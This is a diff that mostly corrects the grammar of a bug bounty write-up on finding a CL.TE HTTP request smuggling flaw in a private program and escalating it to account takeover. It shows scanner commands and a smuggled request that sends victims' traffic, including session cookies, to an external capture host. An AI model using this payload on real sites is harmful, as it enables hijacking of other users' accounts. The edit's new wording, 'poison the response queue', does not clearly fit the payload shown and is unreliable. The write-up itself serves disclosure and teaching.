@@ -7,25 +7,25 @@ tags: [bug hunting, web, http request smuggling, writeups]
 ---
 
 ## **Introduction**
-Peace be upon you all, this is actually my first writeup which going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program which I was able to escalate it Full account takeover. I am going to share with you how to search for this vulnerability in a large scale and what the best tool and resource to utilize when testing for this vulnerability.
+Peace be upon you all, this is actually my first writeup which is going to be about a very interesting vulnerability, HTTP Request Smuggling, which I found in a private program, which I was able to escalate it to full account takeover. I am going to share with you how to search for this vulnerability on a large scale and what the best tool and resource to utilize when testing for this vulnerability.
 
-It begins almost when the amazing researcher [James kettle](https://twitter.com/albinowax) announce his new research at DEFCON which address a new era of the HTTP request smuggling but this time for HTTP/2. I watched the video and I couldn't understand any thing, So I went back and studied the previous version of this attack and I thought what about testing this "rare attack" as some people think before moving to the new one. I ended up finding this critical vulnerability at two different private programs.
+It begins almost when the amazing researcher [James kettle](https://twitter.com/albinowax) announce his new research at DEFCON, which addresses a new era of the HTTP request smuggling but this time for HTTP/2. I watched the video, and I couldn't understand anything, So I went back and studied the previous version of this attack, and I thought what about testing this "rare attack" as some people think, before moving to the new one. I ended up finding this critical vulnerability in two different private programs.
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiH8QkhdKu6BciITe6D%2F-MiHFxfVj0C3vf_kr-u0%2Ftwitter.png?alt=media&token=76b7e577-2df0-4f4c-96f1-c7624ad3a351)
 
 ## **About HTTP Request Smuggling**
 HTTP request smuggling is an attack in which an attacker interferes with the processing of a sequence of HTTP requests that a web application receives from one or more users. Vulnerabilities related to HTTP request smuggling are often critical, allowing an attacker to bypass security measures, gain unauthorized access to sensitive data, and directly compromise the information of other users of the application.
 
-I am not going to cover it here because Portswigger did really good job at explaining this with practical Labs.
+I am not going to cover it here because Portswigger did a really good job at explaining this with practical Labs.
 
 [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
 
 ## **Methodology**
-After you had learned about the vulnerability you can start looking for it in some bug bounty programs. you have two methods but remember you need to test this with caution because it is very harmful:
+After you have learned about the vulnerability, you can start looking for it in some bug bounty programs. You have two methods but remember you need to test this with caution because it is very harmful:
 
-1.Using HTTP Request Smuggling Burp Extension either burp community or pro. you can widen your scope by adding more subdomains and URLs select them all and from the extension tab click **smuggle probe.**
+1.Using the HTTP Request Smuggling Burp Extension, either the burp community or pro. You can widen your scope by adding more subdomains and URLs, selecting them all, and from the extension tab, clicking **smuggle probe.**
 
-‌2\. Using [smuggler.py](https://github.com/defparam/smuggler) tool which is a command line tool that replicate almost the same work of burp extension.
+‌2\. Using [smuggler.py](https://github.com/defparam/smuggler) tool which is a command line tool that replicate almost the same process of the burp extension.
 
 ```bash
 # Single Host:
@@ -34,11 +34,11 @@ python3 smuggler.py -u <URL>
 # List of hosts:
 cat list_of_hosts.txt | python3 smuggler.py
 ```
-‌Note: These scanner will not guarantee the existing of vulnerability, there are false positives so you need to validate every finding of any of these tools.
+‌Note: These scanners will not guarantee the existence of vulnerabilities; there are false positives, so you need to validate every finding of any of these tools.
 ‌
 ## **The Finding**
 
-Since it is a private program we are going to name it as `readcted.com`I started by collecting some subdomains then I feed all those subdomain to burp and started to crawl the website. Then I run burp extension scanner in all the subdomains. and after some time I found this issue at my target tab.
+Since it is a private program, we are going to name it as `readcted.com` I started by collecting some subdomains, then I fed all those subdomains to burp and started to crawl the website. Then I run the burp extension scanner in all the subdomains. And after some time, I found this issue on my target tab.
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiH8QkhdKu6BciITe6D%2F-MiHNT93loWWcwRV3sTA%2Fburp_issue.png?alt=media&token=4d18476c-72bc-4dcc-add0-d7de0ee221db)
 
@@ -46,7 +46,7 @@ It is a CT.TE Here, the front-end server uses the `Content-Length` header and th
 
 ### **Validating**
 
-I started now to validate if the vulnerability exits of its just a false positive. I send the following request:
+I started now to validate if the vulnerability exits or it is just a false positive. I sent the following request:
 
 ```
 POST / HTTP/1.1 
@@ -102,7 +102,7 @@ The problem is that the redirection is locally in the website and we need an ext
 
 ### **Escalating to Full Account takeover**
 
-Now let's craft our request that will be smuggled to send our malicious one. I will [request bin ](https://requestbin.com/)to receive users traffic into my endpoint. the payload shall looks like the following:
+Now let's craft our request that will be smuggled to send our malicious one. I will use [request bin ](https://requestbin.com/) to poison the response queue and receive users responses into my endpoint. The payload will look like the following:
 ‌
 ```
 POST / HTTP/1.1
@@ -119,18 +119,18 @@ GET /video HTTP/1.1
 Host: enfliy4kmrr8i.x.pipedream.net
 Foo: x
 ```
-and then pass our request to turbo intruder and start our attack:
+And then pass our request to the turbo intruder to start our attack:
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMqTVoY0h_myvBGJ3h%2F-MiN12rU2wKYeV-0YdJu%2F1-turbo-intruder-redacted.png?alt=media&token=2cc95312-90cc-49ad-aee0-9016c56a0f11)
 
-Okay, the attack worked now let's back to or endpoint to see what's happen.
+Okay, the attack worked. Now let's go back to our the endpoint to see what's happened.
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MR5KvOL_gXbwMWP6Z6m%2F-MiMqTVoY0h_myvBGJ3h%2F-MiN2Uly_EoUyexj4Omh%2F3-Request%20bin%20--%20with%20Cookie-redacted.png?alt=media&token=2b599ba5-3516-45b1-914b-341164a2c1fc)
 
-**BOOM!!** My endpoint is flooding with requests that contains cookie. Now, I can fully takeover any account who is browsing the website.
+**BOOM!!** My endpoint is flooding with requests (other users responses) that contain cookies. Now, I can fully take over any account that is browsing the website.
 
 ## **Conclusion**
 
-I have reported this and they are working on a fix at the current moment. The sad story is that this report has been closed as duplicate but I was able to find the same technique on anther website and received 4 digit bounty as reward.
+I have reported this, and they are working on a fix at the current moment. The sad story is that this report has been closed as a duplicate, but I was able to find the same technique on another website and received a 4-digit bounty as a reward.
 
-I hope you enjoyed reading this and if you have any question feel free to ping me any time, Happy Hunting!
+I hope you enjoyed reading this, and if you have any questions, feel free to ping me any time, Happy Hunting!
